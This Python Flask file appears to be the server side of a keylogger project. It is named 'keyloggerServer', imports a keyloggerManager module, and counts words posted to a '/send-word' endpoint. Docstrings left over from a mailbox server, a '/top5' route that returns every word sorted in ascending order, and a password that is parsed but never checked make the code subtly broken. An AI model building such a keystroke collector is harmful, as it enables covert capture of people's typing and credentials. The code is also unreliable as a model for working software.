from flask import Flask
from flask import jsonify
from flask import request
import more_itertools
import operator
import argparse
import json
import keyloggerManager

words ={}

app = Flask('RaspberryPi Mailbox Server')



@app.route("/top5", methods =['GET'])
def top_five():
	global words
	sorted_words = {k: v for k, v in sorted(words.items(), key=lambda item: item[1])}
	return sorted_words





@app.route('/send-word', methods=['POST'])
def post_mail_callback():
    """
    Summary: A callback for when POST is called on [host]:[port]/mailbox/send-mail
    Returns:
        string: A JSON-formatted string containing the response message
    """

    # Get the payload containing the sender, subject and body parameters
    payload = request.get_json()

    new_word = payload['word']
    if new_word not in words:
    	words[new_word] = 1
    else:
    	words[new_word] += 1

    #print(payload)

    #mailbox_manager.add_mail(payload)
    response = {'Response': payload['word'] + ' was added'}

    # The object returned will be sent back as an HTTP message to the requester
    return json.dumps(response)



if __name__ == '__main__':
    # Set up argparse, a Python module for handling command-line arguments
    parser = argparse.ArgumentParser(prog='keyloggerServer',
            description='Script to start up keyloggerServer server')

    parser.add_argument('-p', metavar='password', required=True,
            help='Required password to access server')

    args = parser.parse_args()

    keylogger_password = args.p   # password
    #keylogger_manager = keyloggerManager.keyloggerManager()

    app.run(debug=False, host='0.0.0.0', port=5000)